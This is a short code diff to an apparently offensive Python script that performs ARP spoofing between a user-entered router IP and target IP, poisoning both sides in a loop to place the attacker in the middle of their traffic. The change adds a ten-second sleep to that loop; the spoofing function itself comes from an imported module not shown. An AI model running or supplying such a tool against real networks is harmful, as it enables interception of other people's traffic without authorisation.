@@ -8,6 +8,7 @@ To enable ARP spoofing, you need to have the following:
 
 """
 
+from time import sleep
 import arp_spoofing as arp_spoofing
 
 router_ip = input("Enter the IP address of the router: ")
@@ -18,6 +19,7 @@ try:
     while True:
         arp_spoofing.spoof_arp(target_ip, router_ip)
         arp_spoofing.spoof_arp(router_ip, target_ip)
+        sleep(10)
 
 except KeyboardInterrupt:
     print('\n[!] Exiting...')
